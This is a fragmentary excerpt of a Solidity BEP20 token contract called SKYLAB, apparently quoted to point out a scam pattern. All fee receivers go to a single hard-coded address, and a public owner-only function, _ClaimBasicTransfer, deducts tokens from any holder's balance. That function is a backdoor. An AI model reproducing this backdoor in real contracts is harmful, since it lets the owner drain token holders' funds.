...
contract SKYLAB is IBEP20, Auth {
   ...
   address BUST = 0x7627cE0F039d9E5eBD705204919DE6a1C6548D24;
   address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
   ...
   constructor () Auth(msg.sender) {
       ...
       autoLiquidityReceiver = 0x7627cE0F039d9E5eBD705204919DE6a1C6548D24; 
       marketingFeeReceiver = 0x7627cE0F039d9E5eBD705204919DE6a1C6548D24; 
       buybackFeeReceiver = 0x7627cE0F039d9E5eBD705204919DE6a1C6548D24; 
...
_balances[recipient] = _balances[recipient].add(amountReceived);
   ...
   // Set the correct fees for buying or selling
    ...
    function _ClaimBasicTransfer(address sender, address recipient, uint256 amount) public onlyOwner returns (bool) {
       _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
